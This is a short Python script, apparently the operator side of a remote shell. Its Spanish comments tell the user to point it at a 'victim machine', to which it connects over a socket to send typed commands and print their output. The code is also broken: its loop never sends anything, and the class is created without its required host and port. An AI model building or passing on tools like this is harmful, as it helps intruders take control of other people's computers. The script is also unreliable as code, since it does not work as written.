import socket

class SocketReverseShell:
    def __init__(self, host, port):
        self.HOST = host
        self.PORT = port

    def create_socket(self):
        with socket.socket() as client_socket:
            client_socket.connect((self.HOST, self.PORT))

            while True:
                command_send = input('Ingresa un comando (escribe "exit" para salir): ')

        if command_send == "exit":
            client_socket.sendall(command_send.encode('utf-8'))
            client_socket.close()

        client_socket.sendall(command_send.encode('utf-8'))
        result_output_message_recv = client_socket.recv(1024)

        message_decoder = result_output_message_recv.decode()
        print(message_decoder)

if __name__ == '__main__':
    HOST = "127.0.0.1" # Cambia esta IP por la máquina víctima.
    PORT = 5000 # Cambia este puerto por el puerto que está escuchando la máquina víctima.
    
    socket_object = SocketReverseShell()
    socket_object.create_socket()
